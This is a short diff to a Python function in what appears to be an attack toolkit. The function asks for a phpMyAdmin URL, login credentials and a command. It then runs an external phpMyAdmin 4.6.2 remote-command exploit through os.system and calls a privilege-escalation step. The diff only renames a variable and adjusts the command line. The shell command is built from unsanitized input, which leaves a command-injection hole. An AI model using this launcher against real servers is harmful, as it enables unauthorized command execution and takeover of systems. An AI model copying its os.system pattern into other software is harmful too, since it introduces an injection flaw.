@@ -233,14 +233,14 @@ def run_phpmyadmin_462_exploit():
     #port=input("Enter Target port (leave empty for default 3306): ")
     #port=port if port else '3306'  # Use default port if none provided
 
-    fullpath=input("Enter PHPMyAdmin full path: example http://localhost/pma ")
-    fullpath=fullpath if fullpath else 'http://localhost/pma'  # Use default port if none provided
+    fullurl=input("Enter PHPMyAdmin full path: example http://localhost/pma ")
+    fullurl=fullurl if fullurl else 'http://localhost/pma'  # Use default port if none provided
     username=input("Enter username: ")
     password=input("Enter password: ")
     command=input("Enter command to execute (e.g., whoami): ")
 
     # Running the exploit with provided inputs
-    os.system(f"python phpMyAdmin-4.6.2-exploit.py -u {username} -pw {password} --pwd="" {fullpath} -c \"{command}\"")
+    os.system(f"python phpmyadmin-4.6.2-exploit.py -u {username} -pw {password} {fullurl} -c \"{command}\"")
     privilege_escalation()
 
 def install_tools():
